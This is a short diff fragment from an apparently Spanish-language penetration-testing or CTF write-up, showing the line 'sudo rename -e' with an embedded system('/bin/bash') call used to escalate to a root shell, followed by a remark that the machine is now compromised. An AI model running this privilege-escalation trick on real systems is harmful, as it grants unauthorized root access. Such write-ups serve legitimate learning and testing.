@@ -346,3 +346,4 @@ sudo rename -e 'system("/bin/bash")' test.txt
 ```
 
 Con esto ya tenemos comprometida la maquina.
+
